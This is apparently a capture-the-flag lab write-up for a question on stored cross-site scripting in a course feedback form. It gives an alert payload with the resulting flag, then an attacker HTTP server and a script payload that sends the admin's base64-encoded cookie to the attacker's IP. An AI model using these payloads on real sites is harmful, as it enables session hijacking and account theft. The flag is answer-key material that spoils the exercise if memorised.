@@ -1,0 +1,17 @@
+question 3:
+
+Part 1
+Login with Rajesh credential then go to any course and see feedback section at bottom.In feedback type: 
+<script>alert("hello");</script>
+A PopUp will come and we will get the flag:
+FLAG{a2LTAn0b7XpbdnCSbZ8ZsnYIEoEzv36R} 
+
+part2
+
+Run the server as Attacker:
+sudo python3 -m http.server 8000
+Now in the feedback section type the xss payload as:
+<script>var i=new Image(); i.src="http://<IP Address>:<PORT>/?cookie="+btoa(document.cookie);</script>
+Where,
+<IP Address> is the ens33 ip address and <PORT> is 8000
+Now look in the terminal where server runs, admin will access the server after 1 min and we will get the cookie in terms of flag
